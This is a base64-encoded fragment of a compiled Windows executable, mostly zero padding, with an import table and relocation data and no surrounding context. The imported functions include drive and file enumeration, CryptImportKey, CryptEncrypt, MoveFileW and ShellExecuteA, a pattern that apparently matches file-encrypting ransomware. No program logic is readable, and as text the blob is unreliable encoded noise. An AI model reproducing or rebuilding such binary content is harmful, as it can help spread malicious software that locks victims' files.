AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaCcBAAAAAAAAAAAASioBACAQAABIJwEAAAAAAAAAAACoKgEAABAAAJgoAQAAAAAAAAAAANoqAQBQEQAAXCcBAAAAAAAAAAAAFisBABQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAG4qAQCYKgEAhioBAFgqAQAAAAAA5ioBAP4qAQAAAAAAMikBAEQpAQBQKQEAZikBAHIpAQCAKQEAkCkBAJwpAQCqKQEAvCkBACopAQDgKQEA7CkBAAYqAQASKgEAIioBADIqAQAaKQEACikBAPQoAQDmKAEA0CgBALooAQDMKQEApCgBACIrAQA8KwEASCsBAFQrAQBkKwEAdCsBAIYrAQCcKwEArisBAMIrAQDWKwEA8isBABAsAQAkLAEAQCwBAEwsAQBaLAEAaCwBAHIsAQCKLAEAniwBAK4sAQDELAEA3CwBAO4sAQD8LAEACi0BABotAQAmLQEAPC0BAFYtAQBwLQEAgi0BAKotAQC4LQEAyi0BAOItAQD8LQEADC4BACIuAQA6LgEAUi4BAF4uAQBoLgEAdC4BAIYuAQCSLgEAoi4BALAuAQDALgEAAAAAALYqAQDGKgEAAAAAAPkEV2FpdEZvclNpbmdsZU9iamVjdAARBVdpZGVDaGFyVG9NdWx0aUJ5dGUAFAJHZXRNb2R1bGVGaWxlTmFtZVcAABoBRXhpdFRocmVhZAAAZwNNdWx0aUJ5dGVUb1dpZGVDaGFyAAICR2V0TGFzdEVycm9yAACbAENyZWF0ZU11dGV4QQAAsgRTbGVlcABmBFNldEZpbGVQb2ludGVyAAAlBVdyaXRlRmlsZQDqAUdldEZpbGVBdHRyaWJ1dGVzVwAAwANSZWFkRmlsZQAAjwBDcmVhdGVGaWxlVwDxAUdldEZpbGVTaXplRXgAYwNNb3ZlRmlsZVcAUgBDbG9zZUhhbmRsZQA5AUZpbmRGaXJzdEZpbGVXAADTAUdldERyaXZlVHlwZVcACQJHZXRMb2dpY2FsRHJpdmVzAAAuAUZpbmRDbG9zZQD3BFdhaXRGb3JNdWx0aXBsZU9iamVjdHMAAEUFbHN0cmNtcGlXAEUBRmluZE5leHRGaWxlVwC1AENyZWF0ZVRocmVhZAAAnAJHZXRVc2VyRGVmYXVsdExhbmdJRAAAS0VSTkVMMzIuZGxsAADLAENyeXB0UmVsZWFzZUNvbnRleHQAsABDcnlwdEFjcXVpcmVDb250ZXh0QQAAygBDcnlwdEltcG9ydEtleQAAugBDcnlwdEVuY3J5cHQAAEFEVkFQSTMyLmRsbAAAHgFTaGVsbEV4ZWN1dGVBAMMAU0hHZXRGb2xkZXJQYXRoVwAAU0hFTEwzMi5kbGwA2ABDcnlwdFN0cmluZ1RvQmluYXJ5QQAAfABDcnlwdEJpbmFyeVRvU3RyaW5nQQAAQ1JZUFQzMi5kbGwAeQJHZXRTeXN0ZW1UaW1lQXNGaWxlVGltZQDPAkhlYXBGcmVlAADLAkhlYXBBbGxvYwDqAEVuY29kZVBvaW50ZXIAygBEZWNvZGVQb2ludGVyAIYBR2V0Q29tbWFuZExpbmVBANMCSGVhcFNldEluZm9ybWF0aW9uAACxA1JhaXNlRXhjZXB0aW9uAADABFRlcm1pbmF0ZVByb2Nlc3MAAMABR2V0Q3VycmVudFByb2Nlc3MA0wRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAAKUEU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAAADSXNEZWJ1Z2dlclByZXNlbnQABANJc1Byb2Nlc3NvckZlYXR1cmVQcmVzZW50AMUEVGxzQWxsb2MAAMcEVGxzR2V0VmFsdWUAyARUbHNTZXRWYWx1ZQDGBFRsc0ZyZWUA7wJJbnRlcmxvY2tlZEluY3JlbWVudAAAGAJHZXRNb2R1bGVIYW5kbGVXAABzBFNldExhc3RFcnJvcgAAxQFHZXRDdXJyZW50VGhyZWFkSWQAAOsCSW50ZXJsb2NrZWREZWNyZW1lbnQAAEUCR2V0UHJvY0FkZHJlc3MAAM0CSGVhcENyZWF0ZQAAGQFFeGl0UHJvY2VzcwBkAkdldFN0ZEhhbmRsZQAA1AJIZWFwU2l6ZQAAEwJHZXRNb2R1bGVGaWxlTmFtZUEAAGEBRnJlZUVudmlyb25tZW50U3RyaW5nc1cA2gFHZXRFbnZpcm9ubWVudFN0cmluZ3NXAABvBFNldEhhbmRsZUNvdW50AADjAkluaXRpYWxpemVDcml0aWNhbFNlY3Rpb25BbmRTcGluQ291bnQA8wFHZXRGaWxlVHlwZQBjAkdldFN0YXJ0dXBJbmZvVwDRAERlbGV0ZUNyaXRpY2FsU2VjdGlvbgCnA1F1ZXJ5UGVyZm9ybWFuY2VDb3VudGVyAJMCR2V0VGlja0NvdW50AADBAUdldEN1cnJlbnRQcm9jZXNzSWQAOQNMZWF2ZUNyaXRpY2FsU2VjdGlvbgAA7gBFbnRlckNyaXRpY2FsU2VjdGlvbgAAcgFHZXRDUEluZm8AaAFHZXRBQ1AAADcCR2V0T0VNQ1AAAAoDSXNWYWxpZENvZGVQYWdlABgEUnRsVW53aW5kAD8DTG9hZExpYnJhcnlXAADSAkhlYXBSZUFsbG9jAC0DTENNYXBTdHJpbmdXAABpAkdldFN0cmluZ1R5cGVXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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8y5DL3MmczhDPNMzw0WzTQNNw07zQBNRw1JDUsNUM1XDV4NYE1hzWQNZU1pDXLNfQ1BTYlNjE2PDdlN7E3vDfCN+c37TfyNwA4BTgKOA84HzhOOFQ4XDijOKg44jjnOO448zj6OP84DTluOXc5fTkFOhQ6IjooOi462DrdOu86DTshOyc7lTu4O8M7yTvZO9477zv3O/07BzwNPBc8HTwnPDA8OzxAPEk8UzxePJk8szzNPM8+1j7cPjY/PD9GP7c/vT/JPwDgAACsAAAAADAYMMAwojS0NMY02DTqNBA1IjU0NUY1WDVqNXw1jjWgNbI1xDXWNeg1ITZqNgM30zdNOHA4CTkcOoE6jToFOx87KDtaO6o73Dv0O/s7AzwIPAw8EDw5PF88fTyEPIg8jDyQPJQ8mDycPKA86jzwPPQ8+Dz8PGI9bT2IPY89lD2YPZw9vT3nPRk+ID4kPig+LD4wPjQ+OD48PoY+jD6QPpQ+mD4A8AAAMAAAAEQxpjFfMncyfDLjNAM19DUHNtU29jfvODg51DpTPII/sj+8P8c/AAAAAAEAGAEAAN4xNDOiM8IzFTRlNJs05TR+Nbs1+zU7Nrs2sjfaNyw49jgnOc456TkEOgk6Ezo4Oj06RzpoOm06dzqYOp06pzrBOtE64TrxOgE7ETsiOyo7OztFO1A7YjtqO3s7hDuJO5I7mjurO7Q7uTvCO8o72zvkO+k78jv6Ows8FDwZPCI8Kjw7PEQ8STxSPFo8azx1PIA8kjyaPKs8tDy5PMI8yjzbPOQ86TzyPPo8Cz0UPRk9ID0kPSk9PD1QPVg9YD1oPWw9cD14PYw9lD2cPaQ9qD2sPbQ9yD3oPQQ+CD4oPjQ+UD5cPng+mD64Ptg++D4YPzQ/OD9UP1g/eD+UP5g/oD+0P7w/0D/YP9w/5D/sPwAAABABADABAAAcMCwwQDBUMGAwaDCoMLgwzDDgMOww9DAMMRQxHDEoMUgxUDFYMWQxhDGQMbAxuDHEMeQx7DH0MfwxBDIMMhQyHDIkMiwyNDI8MkgyaDJ0MpQyoDLAMswy7DL0MvwyBDMMMxQzHDMkMzAzVDNcM2QzbDN0M3wzhDOMM5QznDOkM6wztDO8M8QzzDPUM9wz5DPsM/Qz/DMENAw0FDQcNCQ0LDQ0NDw0SDRoNHQ0lDScNKQ0rDS0NMA05DTsNPQ0/DQENQw1FDUcNSQ1LDU0NTw1RDVMNVQ1YDWANYw1rDW0Nbw1xDXMNdQ13DXkNew19DX8NQQ2DDYUNiA2WDZgNmQ2fDaANpA2tDbANsg2+DYANwQ3HDcgNzw3QDdIN1A3WDdcN2Q3eDcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA